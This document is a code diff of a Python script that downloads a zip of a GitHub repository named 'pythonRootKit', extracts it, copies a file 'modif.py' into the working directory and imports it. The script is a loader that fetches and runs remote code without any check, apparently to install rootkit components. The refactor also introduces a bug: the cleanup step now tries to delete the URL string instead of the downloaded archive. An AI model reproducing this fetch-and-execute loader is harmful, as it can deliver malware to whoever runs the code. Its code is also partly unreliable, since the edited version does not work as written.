@@ -1,42 +1,27 @@
 from fileinput import filename
-import requests
-import zipfile
-import os
-import shutil
-import time
+import requests, zipfile, os, shutil, time
 data = "https://github.com/N0SAFE/pythonRootKit/archive/main.zip"
-
 
 def getpath(change=False):
     if change in (False, "not", "\\"):
         return os.getcwd()
-    else:
-        return os.getcwd().replace('\\', '/')
+    else: return os.getcwd().replace('\\', '/')
 def getFileName():
     return os.path.basename(__file__)
 def getNameDir(data):
-    NameDir = data.split("/")
-    deleteExtension = (data.split("/")[len(NameDir)-1]).split(".")
-    result = (deleteExtension[0])
-    result = (data.split("/")[len(NameDir)-3])+"-"+result
-    return result
+    return (data.split("/")[len(data.split("/"))-3])+"-"+(((data.split("/")[len(data.split("/"))-1]).split("."))[0])
 
 def supDir(data):
     shutil.rmtree(data)
     
-def downloadFileGithub(file_url):
-    data=".zip"
-    r = requests.get(file_url, stream = True) 
+def downloadFileGithub(file_url, data=".zip"):
     with open(data,"wb") as zip	: 
-        for chunk in r.iter_content(chunk_size=1024): 
+        for chunk in (requests.get(file_url, stream = True)).iter_content(chunk_size=1024): 
              # writing one chunk at a time to zip file 
-             if chunk: 
-                 zip.write(chunk)
+             if chunk: zip.write(chunk)
     unzipfile()
     
-def unzipfile():
-    data=".zip"
-    file = data
+def unzipfile(file=".zip"):
     # ouvrir le fichier zip en mode lecture
     with zipfile.ZipFile(file, 'r') as zip: 
         # extraire tous les fichiers
@@ -44,21 +29,17 @@ def unzipfile():
     os.remove(data)
 
 def sortNameFile(data):
-    from os import listdir
     from os.path import isfile, join
-    return [f for f in listdir(data) if isfile(join(data, f))]
+    return [f for f in os.listdir(data) if isfile(join(data, f))]
     
 def moveFileFromDir(data):
     fichiers = []
     fichiers.append("modif.py")
     for f in range(len(fichiers)):
         if fichiers[f] != getFileName():
-            path = getpath(True)
-            path = path+"/"+data+"/"+fichiers[f]
-            shutil.copy(path, getpath(True))
+            shutil.copy(getpath(True)+"/"+data+"/"+fichiers[f], getpath(True))
 
-try:
-    import modif
+try: import modif
 except:
     dir = getNameDir(data)
     downloadFileGithub(data)
